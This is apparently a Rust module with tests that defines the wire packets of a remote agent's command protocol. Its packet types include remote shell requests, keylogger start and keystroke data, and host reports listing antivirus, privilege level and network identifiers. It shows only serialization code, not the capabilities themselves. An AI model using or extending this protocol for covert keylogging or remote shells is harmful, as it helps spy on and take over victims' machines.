use thiserror::Error;

use super::{
    AgentAuth, AgentAuthResponse, AgentControl, EncryptionRequest, EncryptionResponse, Heartbeat,
    KeyloggerData, KeyloggerRequest, ShellRequest, StreamClose, StreamData, StreamError, StreamOpen,
    SystemInfo,
};

#[derive(Debug)]
pub enum Packets {
    EncryptionRequest(EncryptionRequest),
    EncryptionResponse(EncryptionResponse),
    StreamOpen(StreamOpen),
    StreamClose(StreamClose),
    StreamData(StreamData),
    StreamError(StreamError),
    Heartbeat(Heartbeat),
    AgentAuth(AgentAuth),
    AgentAuthResponse(AgentAuthResponse),
    SystemInfo(Box<SystemInfo>),
    AgentControl(AgentControl),
    ShellRequest(ShellRequest),
    KeyloggerRequest(KeyloggerRequest),
    KeyloggerData(KeyloggerData),
}

#[derive(Error, Debug)]
pub enum PacketError {
    #[error("Got unknown packet code : {0}")]
    UnknownPacket(String),
    #[error("Error while encoding packet: {0}")]
    EncodingError(String),
    #[error("Error while decoding packet: {0}")]
    DecodingError(String),
}

pub trait Packet {
    /// Serializes the packet.
    ///
    /// # Errors
    /// Returns an error if serialization fails.
    fn serialize(&self) -> Result<Vec<u8>, PacketError>;
    /// Deserializes a packet from byte data.
    ///
    /// # Errors
    /// Returns an error if deserialization fails.
    fn deserialize(data: &[u8]) -> Result<Self, PacketError>
    where
        Self: Sized;
    fn packet_code() -> u8;
}

/// Deserializes a packet from raw bytes.
///
/// # Errors
/// Returns an error if deserialization fails or the packet code is unknown.
pub fn from_packet_bytes(data: &[u8]) -> Result<Packets, PacketError> {
    let packet_code = data[0];
    let data = &data[1..];
    match packet_code {
        0x01 => Ok(Packets::EncryptionRequest(EncryptionRequest::deserialize(
            data,
        )?)),
        0x02 => Ok(Packets::EncryptionResponse(
            EncryptionResponse::deserialize(data)?,
        )),
        0x03 => Ok(Packets::StreamOpen(StreamOpen::deserialize(data)?)),
        0x04 => Ok(Packets::StreamClose(StreamClose::deserialize(data)?)),
        0x05 => Ok(Packets::StreamData(StreamData::deserialize(data)?)),
        0x06 => Ok(Packets::StreamError(StreamError::deserialize(data)?)),
        0x07 => Ok(Packets::Heartbeat(Heartbeat::deserialize(data)?)),
        0x08 => Ok(Packets::AgentAuth(AgentAuth::deserialize(data)?)),
        0x09 => Ok(Packets::AgentAuthResponse(AgentAuthResponse::deserialize(
            data,
        )?)),
        0x0A => Ok(Packets::SystemInfo(Box::new(SystemInfo::deserialize(data)?))),
        0x0B => Ok(Packets::AgentControl(AgentControl::deserialize(data)?)),
        0x0C => Ok(Packets::ShellRequest(ShellRequest::deserialize(data)?)),
        0x0D => Ok(Packets::KeyloggerRequest(KeyloggerRequest::deserialize(
            data,
        )?)),
        0x0E => Ok(Packets::KeyloggerData(KeyloggerData::deserialize(data)?)),
        _ => Err(PacketError::UnknownPacket(packet_code.to_string())),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // serialize() already prepends the packet code byte,
    // so we can pass the result directly to from_packet_bytes
    fn to_wire<P: Packet>(packet: &P) -> Vec<u8> {
        packet.serialize().unwrap()
    }

    #[test]
    fn from_packet_bytes_heartbeat() {
        let pkt = Heartbeat::new();
        let bytes = to_wire(&pkt);
        assert!(matches!(from_packet_bytes(&bytes), Ok(Packets::Heartbeat(_))));
    }

    #[test]
    fn from_packet_bytes_encryption_request() {
        let pkt = EncryptionRequest::new([0xAA; 32], 42);
        let bytes = to_wire(&pkt);
        assert!(matches!(from_packet_bytes(&bytes), Ok(Packets::EncryptionRequest(_))));
    }

    #[test]
    fn from_packet_bytes_encryption_response() {
        let pkt = EncryptionResponse::new([0xBB; 32], [0xCC; 12], [0xDD; 24]);
        let bytes = to_wire(&pkt);
        assert!(matches!(from_packet_bytes(&bytes), Ok(Packets::EncryptionResponse(_))));
    }

    #[test]
    fn from_packet_bytes_stream_open() {
        let pkt = StreamOpen { stream_id: 1 };
        let bytes = to_wire(&pkt);
        assert!(matches!(from_packet_bytes(&bytes), Ok(Packets::StreamOpen(_))));
    }

    #[test]
    fn from_packet_bytes_stream_close() {
        let pkt = StreamClose { stream_id: 1 };
        let bytes = to_wire(&pkt);
        assert!(matches!(from_packet_bytes(&bytes), Ok(Packets::StreamClose(_))));
    }

    #[test]
    fn from_packet_bytes_stream_data() {
        let pkt = StreamData { stream_id: 1, data: vec![1, 2, 3] };
        let bytes = to_wire(&pkt);
        assert!(matches!(from_packet_bytes(&bytes), Ok(Packets::StreamData(_))));
    }

    #[test]
    fn from_packet_bytes_stream_error() {
        let pkt = StreamError { stream_id: 1, error: "err".to_string() };
        let bytes = to_wire(&pkt);
        assert!(matches!(from_packet_bytes(&bytes), Ok(Packets::StreamError(_))));
    }

    #[test]
    fn from_packet_bytes_agent_auth() {
        let pkt = AgentAuth::new("audit".to_string(), "token".to_string(), "host".to_string());
        let bytes = to_wire(&pkt);
        assert!(matches!(from_packet_bytes(&bytes), Ok(Packets::AgentAuth(_))));
    }

    #[test]
    fn from_packet_bytes_agent_auth_response() {
        let pkt = AgentAuthResponse::new(true, "ok".to_string());
        let bytes = to_wire(&pkt);
        assert!(matches!(from_packet_bytes(&bytes), Ok(Packets::AgentAuthResponse(_))));
    }

    #[test]
    fn from_packet_bytes_system_info() {
        let pkt = SystemInfo {
            hostname: "h".to_string(), os_name: "o".to_string(), os_version: "v".to_string(),
            cpu_name: "c".to_string(), cpu_count: 1, total_memory_bytes: 1, used_memory_bytes: 1,
            uptime_secs: 1, agent_version: "1.0.0".to_string(), gpu_name: None,
            username: "user".to_string(), is_elevated: false, arch: "x86_64".to_string(),
            locale: None, local_ips: vec![], mac_address: None, domain: None,
            total_disk_bytes: 0, used_disk_bytes: 0, antivirus: vec![], firewall_enabled: None,
        };
        let bytes = to_wire(&pkt);
        assert!(matches!(from_packet_bytes(&bytes), Ok(Packets::SystemInfo(_))));
    }

    #[test]
    fn from_packet_bytes_agent_control() {
        let pkt = AgentControl::pause();
        let bytes = to_wire(&pkt);
        assert!(matches!(from_packet_bytes(&bytes), Ok(Packets::AgentControl(_))));
    }

    #[test]
    fn from_packet_bytes_shell_request() {
        let pkt = ShellRequest::bash();
        let bytes = to_wire(&pkt);
        assert!(matches!(from_packet_bytes(&bytes), Ok(Packets::ShellRequest(_))));
    }

    #[test]
    fn from_packet_bytes_keylogger_request() {
        let pkt = KeyloggerRequest::start();
        let bytes = to_wire(&pkt);
        assert!(matches!(from_packet_bytes(&bytes), Ok(Packets::KeyloggerRequest(_))));
    }

    #[test]
    fn from_packet_bytes_keylogger_data() {
        let pkt = KeyloggerData::new(vec![0x41]);
        let bytes = to_wire(&pkt);
        assert!(matches!(from_packet_bytes(&bytes), Ok(Packets::KeyloggerData(_))));
    }

    #[test]
    fn from_packet_bytes_unknown_code() {
        let bytes = vec![0xFF, 0x00];
        assert!(matches!(from_packet_bytes(&bytes), Err(PacketError::UnknownPacket(_))));
    }

    #[test]
    fn packet_error_display() {
        let err = PacketError::UnknownPacket("255".to_string());
        assert!(format!("{err}").contains("255"));
        let err = PacketError::EncodingError("test".to_string());
        assert!(format!("{err}").contains("test"));
        let err = PacketError::DecodingError("test".to_string());
        assert!(format!("{err}").contains("test"));
    }

    #[test]
    fn serialized_bytes_start_with_correct_packet_code() {
        // Verify the wire format: first byte must be the packet code,
        // followed by the bincode-encoded payload.
        let heartbeat_bytes = Heartbeat::new().serialize().unwrap();
        assert_eq!(heartbeat_bytes[0], Heartbeat::packet_code());

        let stream_bytes = StreamData { stream_id: 1, data: vec![0xFF] }.serialize().unwrap();
        assert_eq!(stream_bytes[0], StreamData::packet_code());

        let ctrl_bytes = AgentControl::pause().serialize().unwrap();
        assert_eq!(ctrl_bytes[0], AgentControl::packet_code());
    }

    #[test]
    #[should_panic]
    fn from_packet_bytes_panics_on_empty_input() {
        // An empty slice has no packet code byte, so indexing data[0] should panic.
        let _ = from_packet_bytes(&[]);
    }

    #[test]
    fn from_packet_bytes_fails_on_valid_code_but_truncated_payload() {
        // A packet code with no payload data should fail deserialization,
        // not silently produce garbage.
        let result = from_packet_bytes(&[0x0A]); // SystemInfo code, zero payload bytes
        assert!(result.is_err());
    }
}
